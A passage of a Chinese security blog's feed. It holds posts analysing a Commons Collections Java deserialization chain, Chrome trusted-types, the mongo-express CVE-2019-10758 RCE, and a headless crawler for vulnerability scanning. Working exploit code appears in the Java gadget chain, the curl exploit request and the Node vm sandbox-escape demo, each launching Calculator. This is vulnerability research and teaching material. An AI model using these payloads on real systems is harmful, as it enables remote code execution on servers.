class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">getpayload</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">"open -a Calculator"</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        Map map = <span class="keyword">new</span> HashMap();</span><br><span class="line">        map.put(<span class="string">"value"</span>, <span class="string">"test"</span>);</span><br><span class="line">        Map transformedMap = TransformedMap.decorate(map, <span class="keyword">null</span>, transformerChain);</span><br><span class="line"></span><br><span class="line">        Class cl = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">        Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object instance = ctor.newInstance(Target.class, transformedMap);</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2020/01/25/jCcsWYhg1HnkVlM.jpg" alt="-w1214"></p><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>最后的<code>transform</code>函数调用使用了<code>jdk1.7</code>底层jar包，所以在不同的jdk版本利用链有所差异(挖坑)，同时这个漏洞的关键在于<code>/org/apache/commons/collections/functors/InvokerTransformer.java</code>可以通过反射调用任意函数，官方发布的新版本中增加了对相关反射调用的限制，同时对这些不安全的Java类的序列化支持增加了开关(也就是黑名单)。</p><p>java项目因为其可以加载很多依赖jar包，导致其反序列化可以寻找的攻击范围很广，从依赖扩展到jdk库，这也是java比php反序列化难的地方。</p><p>此外，简单学习了一些java语法后就开始分析漏洞，很多java语法特性以及概念不太熟悉，比如反射、嵌套类、JMX、JNDI等等，接下来打算好好弥补一下这方面的短板。</p><p>参考：</p><ul><li><a href="https://www.xmanblog.net/java-deserialize-apache-commons-collections/" target="_blank" rel="noopener">https://www.xmanblog.net/java-deserialize-apache-commons-collections/</a></li><li><a href="https://xz.aliyun.com/t/4558#toc-0" target="_blank" rel="noopener">https://xz.aliyun.com/t/4558#toc-0</a></li><li><a href="https://xz.aliyun.com/t/4711" target="_blank" rel="noopener">https://xz.aliyun.com/t/4711</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="Web" scheme="http://0day.design/categories/Web/"/>
    
    
      <category term="Java" scheme="http://0day.design/tags/Java/"/>
    
      <category term="漏洞分析" scheme="http://0day.design/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>CSP:trusted-types 初体验</title>
    <link href="http://0day.design/2020/01/14/CSPtrusted-types%20%E5%88%9D%E4%BD%93%E9%AA%8C/"/>
    <id>http://0day.design/2020/01/14/CSPtrusted-types 初体验/</id>
    <published>2020-01-14T12:30:00.000Z</published>
    <updated>2020-01-20T05:14:49.579Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>文章首发<a href="https://xz.aliyun.com/t/7108" target="_blank" rel="noopener">先知社区</a></p><p>之前被问到这样一个有意思的问题，为什么新版Chrome取消了XSS Audit机制？</p><p>以前<a href="https://zhuanlan.zhihu.com/p/74288648" target="_blank" rel="noopener">看到过文章</a>说新版Chrome取消这个的原因是因为被绕过的姿势过多(我也不知道几个)或者说是误报影响到正常功能了。并说用<code>trusted-types</code>的API替换<code>XSS Audit</code>能彻底杜绝<code>DOM XSS</code>。</p><p>仔细跟了一下<a href="https://developers.google.com/web/updates/2019/02/trusted-types" target="_blank" rel="noopener">谷歌的开发文档介绍</a>，通过给CSP配置一个<code>trusted-types</code>属性：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: trusted-types *</span><br></pre></td></tr></table></figure></p><p>本地测试79.0版本：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"Content-Security-Policy: trusted-types *"</span>);</span><br><span class="line">$a= <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;script&gt;</span></span><br><span class="line"><span class="string">const templateId = location.hash.match(/tplid=([^;&amp;]*)/)[1];</span></span><br><span class="line"><span class="string">// typeof templateId == "string"</span></span><br><span class="line"><span class="string">document.head.innerHTML += decodeURI(templateId) // Throws a TypeError.</span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">EOF;</span></span><br><span class="line"><span class="keyword">echo</span> $a;</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2020/01/14/BpweX4RQ1CZAW3g.jpg" alt="-w1031"></p><p>但是并没有抛出错误，继续翻了下文档，找到问题所在:<br><img src="https://i.loli.net/2020/01/14/noSBxectQUGKXjp.jpg" alt="-w1022"><br>需要用Chrome73-78的版本，其次默认配置是不开的，访问<code>chrome://flags/#enable-experimental-web-platform-features</code>将其配置打开。</p><p>这里用Chrome78测试：<br><img src="https://i.loli.net/2020/01/14/XVCrkMn9Sjt5hqw.jpg" alt="-w838"></p><p><img src="https://i.loli.net/2020/01/14/KblJWSctxfqOByX.jpg" alt="-w1258"></p><p>抛出一个错误，强制要求我们使用<code>TrustedHTML</code>，修改代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"Content-Security-Policy: trusted-types *"</span>);</span><br><span class="line">$a= <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;script&gt;</span></span><br><span class="line"><span class="string">const templatePolicy = TrustedTypes.createPolicy('template', &#123;</span></span><br><span class="line"><span class="string">    createHTML: (templateId) =&gt; &#123;</span></span><br><span class="line"><span class="string">      const tpl = templateId;</span></span><br><span class="line"><span class="string">      if (/^[0-9a-z-]$/.test(tpl)) &#123;</span></span><br><span class="line"><span class="string">        return `&lt;link rel="stylesheet" href="./templates/\$&#123;tpl&#125;/style.css"&gt;`;</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string">      throw new TypeError();</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">  &#125;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">const html = templatePolicy.createHTML(location.hash.match(/tplid=([^;&amp;]*)/)[1]);</span></span><br><span class="line"><span class="string">// html instanceof TrustedHTML</span></span><br><span class="line"><span class="string">document.head.innerHTML = html;</span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">EOF;</span></span><br><span class="line"><span class="keyword">echo</span> $a;</span><br></pre></td></tr></table></figure></p><p>通过<code>TrustedTypes.createPolicy</code>自定义过滤后，return一个<code>TrustedHTML</code>来满足CSP的可信要求：<br><img src="https://i.loli.net/2020/01/15/bt3xTEq5dGWmU8N.jpg" alt="-w1015"></p><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>在Chrome79下,即使我们开启了<code>Experimental Web Platform features</code>这个配置，仍然会遇到<code>TrustedTypes is not defined</code>的问题，emm可能功能正在试验中，然后新版又给移除了？<br><img src="https://i.loli.net/2020/01/14/chTDAemO3dyiVjP.jpg" alt="-w1046"></p><p>其次因为这个问题测试的时候，Chrome会默认更新到79版本有点烦，去<a href="https://www.chromedownloads.net/chrome64win/" target="_blank" rel="noopener">这里</a>，找了个78版本的下载，接着输<code>msconfig</code>把谷歌服务的更新关了即可<br><img src="https://i.loli.net/2020/01/14/PRvEKkwYAepyD75.jpg" alt="-w1136"><br>最后打开Chrome效果是这样的：<br><img src="https://i.loli.net/2020/01/14/UIfsWblVG7FQO6T.jpg" alt="-w730"></p><p>最后简单总结一下，Chrome取消了XSS Auditor，取而代之的是<code>trusted-types</code>可信API，声称可以彻底杜绝DOM XSS，经过一番体验后，其实本质上为强制开发写一段更为严格的过滤规则。</p><p>拭目以待，看看之后谷歌有什么新的想法~</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="Web" scheme="http://0day.design/categories/Web/"/>
    
    
      <category term="前端安全" scheme="http://0day.design/tags/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2019-10758 mongo-express RCE复现分析</title>
    <link href="http://0day.design/2020/01/08/CVE-2019-10758%E5%A4%8D%E7%8E%B0/"/>
    <id>http://0day.design/2020/01/08/CVE-2019-10758复现/</id>
    <published>2020-01-08T09:26:00.000Z</published>
    <updated>2020-01-09T11:46:06.626Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>拉一个MongoDB的docker镜像：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -p 27017:27017 -d mongo</span><br></pre></td></tr></table></figure></p><p>本地<code>npm init</code>创建个<code>package.json</code>，接着添加依赖库<a href="mailto:`mongo-express@0.53.0" target="_blank" rel="noopener">`mongo-express@0.53.0</a><code>,</code>npm install`安装<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;dependencies&quot;: &#123;</span><br><span class="line">  &quot;mongo-express&quot;: &quot;0.53.0&quot;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure></p><p>EXP:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl &apos;http://localhost:8081/checkValid&apos; -H &apos;Authorization: Basic YWRtaW46cGFzcw==&apos;  --data &apos;document=this.constructor.constructor(&quot;return process&quot;)().mainModule.require(&quot;child_process&quot;).execSync(&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;)&apos;</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2020/01/08/IdKYBmSTFE2wXjo.jpg" alt="-w1093"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>先来看看<code>checkValid</code>这个路由：lib/router.js#279行<br><img src="https://i.loli.net/2020/01/08/GPdTktMignySW7b.jpg" alt="-w1092"></p><p>跟进<code>checkValid</code>函数：lib/routes/document.js#28<br><img src="https://i.loli.net/2020/01/08/pNMWhLa23QjFBiR.jpg" alt="-w1074"></p><p>获取post的的<code>doc</code>参数，使用bson库进行BSON数据转换。</p><blockquote><p>BSON是一种计算机数据交换格式，主要被用作MongoDB数据库中的数据存储和网络传输格式。它是一种二进制表示形式，能用来表示简单数据结构、关联数组（MongoDB中称为“对象”或“文档”）以及MongoDB中的各种数据类型。BSON之名缘于JSON，含义为Binary JSON（二进制JSON）</p></blockquote><p>跟进toBSON函数：lib/bson.js#54<br><img src="https://i.loli.net/2020/01/08/JdDlmgjT7A8cq3M.jpg" alt="-w1471"><br>在第60行进入vm沙箱eval操作。</p><p>使用<code>this.constructor.constructor</code>逃逸沙箱，参考<a href="https://xz.aliyun.com/t/7056" target="_blank" rel="noopener">https://pwnisher.gitlab.io/nodejs/sandbox/2019/02/21/sandboxing-nodejs-is-hard.html</a>，使用<code>this</code>指向VM容器外，使用<code>.constructor</code>指向构造器，访问构造器的构造器对象，创建一个构造函数。</p><p>demo:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">"use strict"</span>;</span><br><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">"vm"</span>);</span><br><span class="line"><span class="keyword">const</span> xyz = vm.runInNewContext(<span class="string">`const process = this.constructor.constructor('return this.process')();</span></span><br><span class="line"><span class="string">process.mainModule.require('child_process').execSync('/Applications/Calculator.app/Contents/MacOS/Calculator').toString()`</span>);</span><br><span class="line"><span class="built_in">console</span>.log(xyz);</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2020/01/08/4XVZOl1FQnp9SvB.jpg" alt="-w1148"></p><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>官方修复删除了vm库的引用：<a href="https://github.com/mongo-express/mongo-express/commit/d8c9bda46a204ecba1d35558452685cd0674e6f2" target="_blank" rel="noopener">https://github.com/mongo-express/mongo-express/commit/d8c9bda46a204ecba1d35558452685cd0674e6f2</a><br><img src="https://i.loli.net/2020/01/08/HlCbfEqkNW2VOvR.jpg" alt="-w1030"></p><p>参考：</p><ul><li><a href="https://xz.aliyun.com/t/7056" target="_blank" rel="noopener">CVE-2019-10758:mongo-expressRCE复现分析</a></li><li><a href="https://github.com/masahiro331/CVE-2019-10758" target="_blank" rel="noopener">CVE-2019-10758 POC</a></li><li><a href="https://pwnisher.gitlab.io/nodejs/sandbox/2019/02/21/sandboxing-nodejs-is-hard.html" target="_blank" rel="noopener">Sandboxing NodeJS is hard, here is why</a></li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Function" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Function</a></li><li><a href="http://dfkaye.github.io/2014/03/14/javascript-eval-and-function-constructor/" target="_blank" rel="noopener">http://dfkaye.github.io/2014/03/14/javascript-eval-and-function-constructor/</a></li><li><a href="https://github.com/i0natan/nodebestpractices/issues/211" target="_blank" rel="noopener">https://github.com/i0natan/nodebestpractices/issues/211</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
    
      <category term="漏洞分析" scheme="http://0day.design/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
      <category term="Web" scheme="http://0day.design/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>NodeJS Headless 动态漏扫爬虫学习记录(爬虫篇)</title>
    <link href="http://0day.design/2020/01/08/NodeJS%20Headless%20%E5%8A%A8%E6%80%81%E6%BC%8F%E6%89%AB%E7%88%AC%E8%99%AB%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95(%E7%88%AC%E8%99%AB%E7%AF%87)/"/>
    <id>http://0day.design/2020/01/08/NodeJS Headless 动态漏扫爬虫学习记录(爬虫篇)/</id>
    <published>2020-01-08T05:20:00.000Z</published>
    <updated>2020-01-08T05:20:30.665Z</updated>
    
    <content type="html"><![CDATA[<p>文章首发先知社区：<a href="https://xz.aliyun.com/t/7064" target="_blank" rel="noopener">https://xz.aliyun.com/t/7064</a>  </p><p>在两年前谷歌推出了一个Headless Chrome NodeJS API:<a href="https://github.com/puppeteer/puppeteer" target="_blank" rel="noopener">Puppeteer</a>，后来Github一个大牛用Python封装了一套api，作为一个第三方api:<a href="https://github.com/miyakogi/pyppeteer" target="_blank" rel="noopener">Pyppeteer</a>。</p><p>在去年的时候，尝试过用Pyppeteer写过动态爬虫，Python版由于是第三方一个作者封装的，更新很慢，落后官方版本很多，很多迷之BUG，比如CDP协议去操作远程chromium，很容易中断导致一堆僵尸进程的chromium关不掉。虽然最后还是顶着各种bug，写成一个勉强能用的工具，但在服务器上很吃内存，一方面也是因为写的任务调度机制也有一些问题，最后服役了许多天天，不想维护了，捡了几个漏洞就退休了。后来在平时的工作和学习中频频接触到nodeJS，于是就趁着这段时间用nodejs重新实现一遍。<br><a id="more"></a></p><h2 id="JS基础"><a href="#JS基础" class="headerlink" title="JS基础"></a>JS基础</h2><h3 id="JS中的事件模型"><a href="#JS中的事件模型" class="headerlink" title="JS中的事件模型"></a>JS中的事件模型</h3><p>分为：内联、DOM0级、DOM2级事件<br><img src="https://i.loli.net/2020/01/05/KHqkNfO5GUPtCYd.jpg" alt="-w1016"></p><h3 id="JS原型链介绍"><a href="#JS原型链介绍" class="headerlink" title="JS原型链介绍"></a>JS原型链介绍</h3><p>Js是一种基于原型的语言，每一个对象都有一个原型对象，对象以其原型为模板、从原型继承方法和属性。原型对象也可能拥有原型，一层一层、以此类推。<br>在传统的面向对象编程中，我们首先会定义“类”，此后创建对象实例时，类中定义的所有属性和方法都被复制到实例中。但在 js 中并不是像这样复制，而是在对象实例和类之间之间建立一个链接。<br>demo:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Cat</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.color = <span class="string">'test'</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> cat = <span class="keyword">new</span> Cat()</span><br><span class="line"><span class="built_in">console</span>.log(cat.__proto__ === Cat.prototype)   <span class="comment">// true</span></span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2020/01/05/hANutc8Tlp4oaMK.jpg" alt="-w909"><br>在 JavaScript 中，如果想访问某个属性，首先会在实例对象（cat）的内部寻找，如果没找到，就会在该对象的原型（<code>cat._proto_</code>，即 <code>Cat.prototype</code>）上找，我们知道，对象的原型也是对象，它也有原型，如果在对象的原型上也没有找到目标属性，则会在对象的原型的原型（<code>Cat.prototype._proto_</code>）上寻找，以此内推，直到找到这个属性或者到达了最顶层。在原型上一层一层寻找，这便是原型链了。</p><h2 id="如何抓取更多的URL"><a href="#如何抓取更多的URL" class="headerlink" title="如何抓取更多的URL"></a>如何抓取更多的URL</h2><p>几种思路，可以直接使用正则抓取，也可以解析各种含有链接的标签，也就是src,href属性等。<br>当然这些都有一定的缺陷，比如相对路径需要单独去处理成完整URl，有的使用的js跳转，而不把URl写到标签内等等。另一种思路即使用动态爬虫的思路，Hook JS，通过触发各种事件信息收集URL。这里计划第一版爬虫先实现简易的URL抓取，之后再进一步优化。首先最常想到的是使用正则抓取，其次可以利用Headless的优势，将动态JS渲染的链接标签、属性抓取。</p><h3 id="收集src、href属性的标签"><a href="#收集src、href属性的标签" class="headerlink" title="收集src、href属性的标签"></a>收集src、href属性的标签</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">function getSrcAndHrefLinks(nodes) &#123;</span><br><span class="line">    let result = [];</span><br><span class="line">    for(let node of nodes)&#123;</span><br><span class="line">        let src = node.getAttribute(&quot;src&quot;);</span><br><span class="line">        let href = node.getAttribute(&quot;href&quot;);</span><br><span class="line">        let action = node.getAttribute(&quot;action&quot;);</span><br><span class="line">        if (src)&#123;</span><br><span class="line">            result.push(src)</span><br><span class="line">        &#125;</span><br><span class="line">        if (href)&#123;</span><br><span class="line">            result.push(href);</span><br><span class="line">        &#125;</span><br><span class="line">        if(action)&#123;</span><br><span class="line">            result.push(action);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return result;</span><br><span class="line">&#125;</span><br><span class="line">const links = await page.$$eval(&apos;[src],[href],[action]&apos;, getSrcAndHrefLinks);</span><br></pre></td></tr></table></figure><p>爬行结果：<br><img src="https://i.loli.net/2020/01/05/LskpidD2mlUJOIo.jpg" alt="-w1366"></p><p>接着通过简单的URL去重、清洗，爬虫便可以进行迭代爬行了。</p><p>经过一番测试后发现，对于下面这种页面URL抓取是会有遗漏的：<br><img src="https://i.loli.net/2020/01/05/eA9Uh6RJVyxTq7Q.jpg" alt="-w1547"></p><p>有的将跳转操作全写入了js事件中，或者有的要进行页面滚动JS才会进一步渲染，无疑遗漏了很多URL。解决这些问题的关键在于模拟用户操作，而用户操作的本质则为触发各种DOM事件。所以接下来需要解决的问题在于收集各种DOM事件，以及去触发它们。</p><h3 id="收集DOM事件"><a href="#收集DOM事件" class="headerlink" title="收集DOM事件"></a>收集DOM事件</h3><p>在学习收集DOM事件的过程中参考了<a href="https://www.anquanke.com/post/id/178339" target="_blank" rel="noopener">9ian1i师傅</a>以及<a href="http://blog.fatezero.org/2018/03/05/web-scanner-crawler-01/" target="_blank" rel="noopener">fate0师傅</a>文章，很感谢前辈们的拓荒。</p><h4 id="Hook事件"><a href="#Hook事件" class="headerlink" title="Hook事件"></a>Hook事件</h4><p>注册事件分为DOM0和DOM2事件，使用方法不同，收集方法也有差异。这里简单介绍了两者的差异<a href="https://www.jianshu.com/p/b850978c2ee8" target="_blank" rel="noopener">DOM0级事件和DOM2级事件区别</a>。以及<a href="https://developer.mozilla.org/zh-CN/docs/Learn/JavaScript/Objects/Object_prototypes" target="_blank" rel="noopener">JavaScript Prototype Chain 原型链学习</a><br><strong>DOM0</strong><br>对于DOM0的事件监听，可以修改所有节点的相关属性原型，设置其访问器属性。<br>demo:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dom0Hook</span>(<span class="params">that, event_name</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"tagname: "</span> + that.tagName + <span class="string">", event_name:"</span> + event_name);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">Object</span>.defineProperties(HTMLElement.prototype, &#123;</span><br><span class="line">    onclick: &#123;<span class="attr">set</span>: <span class="function"><span class="keyword">function</span>(<span class="params">newValue</span>)</span>&#123;onclick = newValue;dom0Hook(<span class="keyword">this</span>, <span class="string">"click"</span>);&#125;&#125;,</span><br><span class="line">    onchange: &#123;<span class="attr">set</span>: <span class="function"><span class="keyword">function</span>(<span class="params">newValue</span>)</span>&#123;onchange = newValue;dom0Hook(<span class="keyword">this</span>, <span class="string">"change"</span>);&#125;&#125;</span><br><span class="line">&#125;);</span><br><span class="line">    $<span class="number">0</span> = <span class="built_in">document</span>.getElementsByTagName(<span class="string">"a"</span>);</span><br><span class="line">    $<span class="number">0</span>[<span class="number">0</span>].onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="built_in">console</span>.log(<span class="string">"a"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2020/01/05/RaAdNwiHEPF2fom.jpg" alt="-w646"></p><p><strong>DOM2</strong><br>DOM2级事件Hook，可以通过修改addEventListener的原型即可：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> oldEvent = Element.prototype.addEventListener;</span><br><span class="line">Element.prototype.addEventListener = <span class="function"><span class="keyword">function</span>(<span class="params">event_name, event_func, useCapture</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"tagname: "</span> + <span class="keyword">this</span>.tagName + <span class="string">", event_name:"</span> + event_name);</span><br><span class="line">    oldEvent.apply(<span class="keyword">this</span>, <span class="built_in">arguments</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2020/01/05/dmCfy7lkevOHa6s.jpg" alt="-w722"></p><p><strong>内联事件</strong><br>除了上述两种绑定事件的办法，还有通过写在标签内的内联事件，无法通过Hook来收集。比如：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"test"</span> <span class="attr">onclick</span>=<span class="string">"alert('1')"</span>&gt;</span>123<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>解决办法是通过遍历节点，执行on事件：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">trigger_inline</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> nodes = <span class="built_in">document</span>.all;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; nodes.length; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> attrs = nodes[i].attributes;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; attrs.length; j++) &#123;</span><br><span class="line">            attr_name = attrs[j].nodeName;</span><br><span class="line">            attr_value = attrs[j].nodeValue;</span><br><span class="line">            <span class="keyword">if</span> (attr_name.substr(<span class="number">0</span>, <span class="number">2</span>) == <span class="string">"on"</span>) &#123;</span><br><span class="line">                <span class="built_in">console</span>.log(attrs[j].nodeName + <span class="string">' : '</span> + attr_value);</span><br><span class="line">                <span class="built_in">eval</span>(attr_value);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (attr_name <span class="keyword">in</span> &#123;<span class="string">"src"</span>: <span class="number">1</span>, <span class="string">"href"</span>: <span class="number">1</span>&#125; &amp;&amp; attrs[j].nodeValue.substr(<span class="number">0</span>, <span class="number">11</span>) == <span class="string">"javascript:"</span>) &#123;</span><br><span class="line">                <span class="built_in">console</span>.log(attrs[j].nodeName + <span class="string">' : '</span> + attr_value);</span><br><span class="line">                <span class="built_in">eval</span>(attr_value.substr(<span class="number">11</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2020/01/05/E8BT97cebUklidu.jpg" alt="-w1064"></p><blockquote><p>或者TreeWalker获取全部节点，用<code>dispatchEvent</code>挨个触发事件<br>而DOM0、DOM2级事件通过收集到的标签和事件名依次触发即可。</p></blockquote><h3 id="导航锁定"><a href="#导航锁定" class="headerlink" 